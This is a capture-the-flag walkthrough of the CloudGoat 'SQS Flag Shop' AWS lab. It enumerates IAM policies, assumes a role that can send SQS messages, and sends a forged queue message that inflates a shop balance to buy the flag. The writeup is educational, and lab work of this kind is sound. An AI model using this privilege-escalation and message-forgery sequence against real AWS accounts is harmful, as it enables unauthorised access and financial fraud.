# CloudGoat Walkthrough: SQS Flag Shop Scenario

## Deploying the Scenario

Once the Terraform process is complete, the starting data for the scenario will be provided. The output will look like:

```
[cloudgoat] terraform output completed with no error code.
cg_web_site_ip = 34.XXX.XXX.XXX:XXXX
cloudgoat_output_sqsuser_access_key_id = AKIXXXXXXXXXXXXXXXXX
cloudgoat_output_sqsuser_secret_key = isbXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

## Setting Up AWS Profile

The scenario provides a set of AWS credentials. Let’s create an AWS profile on the command line:

```sh
$ aws configure --profile sqs_user

AWS Access Key ID [******************QP]:
AWS Secret Access Key [******************2U]:
Default region name [us-east-1]:
Default output format [json]:
```

After setting up the profile for an AWS account, the first command to run is the AWS equivalent to ‘whoami’ so we can understand more about our user.

```sh
$ aws --profile sqs_user sts get-caller-identity

{
    "UserId": "XXXXXXXXXXXXXXXXXXZF4",
    "Account": "XXXXXXXXXXXX",
    "Arn": "arn:aws:iam::XXXXXXXX:user/cg-sqs-user-sqs_flag_shop_cgidbXXXXXXXXX"	 
}
```

This returns a JSON object containing:

- **UserId**
- **Account**
- **Arn**

More information about **Amazon Resource Names (ARNs)** can be found in the [AWS Documentation](https://docs.aws.amazon.com/).

## Enumerating User Policies

AWS policies define permissions for identities and resources. Let’s see what policies are associated with our user:

```sh
$ aws --profile sqs_user iam list-user-policies --user-name cg-sqs-user-sqs_flag_shop_cgidXXXXXXXX

{
   "PolicyNames": [
      "cg-sqs-scenario-assumed-role-policy"
    ]
}
```

This user has one attached policy. Let’s view its contents:

```sh
$ aws --profile sqs_user iam get-user-policy --user-name cg-sqs-user-sqs_flag_shop_cgidXXXXXXXXXX --policy-name cg-sqs-scenario-assumed-role-policy

{
   "UserName": "cg-sqs-user-sqs_flag_shop_cgidXXXXXXXXXX",
   "PolicyName": "cg-sqs-scenario-assumed-role-policy",
   "PolicyDocument": {
       "Version": "2012-10-17",
       "Statement": [
           {
               "Action": [
                   "iam:Get*",
                   "iam:List*"
               ],
               "Effect": "Allow",
               "Resource": "*",
               "Sid": "VisualEditor0"
           },
           {
               "Action": "sts:AssumeRole",
               "Effect": "Allow",
               "Resource": "arn:aws:iam::XXXXXXXXXXXX:role/cg-sqs_send_msg_role",
               "Sid": "VisualEditor1"
           }
       ]
   }
}
```

This policy allows us to assume a role! Let’s check the policies attached to that role:

```sh
$ aws --profile sqs_user iam list-role-policies --role-name cg-sqs_send_msg_role

{
    "PolicyNames": [
        "cg-sqs_scenario_policy"
    ]
}
```

The role `cg-sqs_send_msg_role` has the attached policy `cg-sqs_scenario_policy`. Let’s inspect it:

```sh
$ aws --profile sqs_user iam get-role-policy --role-name cg-sqs_send_msg_role --policy-name cg-sqs_scenario_policy

{
	"RoleName": "cg-sqs_send_msg_role",
	"PolicyName": "cg-sqs_scenario_policy",
	"PolicyDocument": {
    	"Version": "2012-10-17",
    	"Statement": [
        	{
            	"Action": [
                	"sqs:GetQueueUrl",
                	"sqs:SendMessage"
            	],
            	"Effect": "Allow",
            	"Resource": "arn:aws:sqs:us-east-1:XXXXXXXXXXXX:cash_charging_queue",
            	"Sid": "VisualEditor0"
        	}
    	]
	}
}
```

## Assuming the SQS Role

Since we can assume the role, let's do it:

```sh
$ aws --profile sqs_user sts assume-role --role-arn arn:aws:iam::XXXXXXXXXXXX:role/cg-sqs_send_msg_role --role-session-name sqs_send_role

{
	"Credentials": {
    	"AccessKeyId": "XXXXXXXXXXXXXXXXLOT5",
    	"SecretAccessKey": "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXQPgU",
    	"SessionToken": "XXX...XXX" ,
    	"Expiration": "2024-02-08T23:29:43+00:00"
	},
	"AssumedRoleUser": {
    	"AssumedRoleId": "XXXXXXXXXXXXXXXXXX2GJ:sqs_send_role",
    	"Arn": "arn:aws:sts::XXXXXXXXXXXX:assumed-role/cg-sqs_send_msg_role/sqs_send_role"
	}
}
```

Configure an AWS profile for this assumed role:

```
[sqs_send_role]
aws_access_key_id = ASIAXXXXXXXXXXXXXXXX
aws_secret_access_key = WmXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
aws_session_token = IQoXXXXXXXX...
```

## Finding the SQS Queue URL

```sh
$ aws --profile sqs_send_role sqs get-queue-url --queue-name cash_charging_queue

{
    "QueueUrl": "https://sqs.us-east-1.amazonaws.com/XXXXXXXX/cash_charging_queue"
}
```

## Web Application Analysis

Visiting the `cg_web_site_ip` in a browser displays a shopping website. Analyzing the network requests reveals a **POST request** when ordering a banana. The website's source code contains a function for `charge_cash`, which accepts a JSON message:

```json
{
    "charge_amount": 100000000
}
```

## Sending an SQS Message

We can send a message to the queue using:

```sh
$ aws --profile sqs_send_role sqs send-message --queue-url https://sqs.us-east-1.amazonaws.com/XXXXXXX/cash_charging_queue --message-body '{"charge_amount": 100000000}'

{
	"MD5OfMessageBody": "a539XXXXXXXXXXXXXXXXXXXXXXXXXXXX",
	"MessageId": "67dcXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX"
}
```

Refreshing the web application now reflects the increased balance, allowing us to purchase the flag.

## Conclusion

In this **SQS Flag Shop CloudGoat scenario**, we:

1. Enumerated user permissions.
2. Assumed a new role with additional permissions.
3. Analyzed the web application to discover its internal logic.
4. Sent a crafted AWS SQS message to increase balance and obtain the flag.

This walkthrough demonstrates how to leverage AWS IAM and SQS permissions in cloud security challenges.
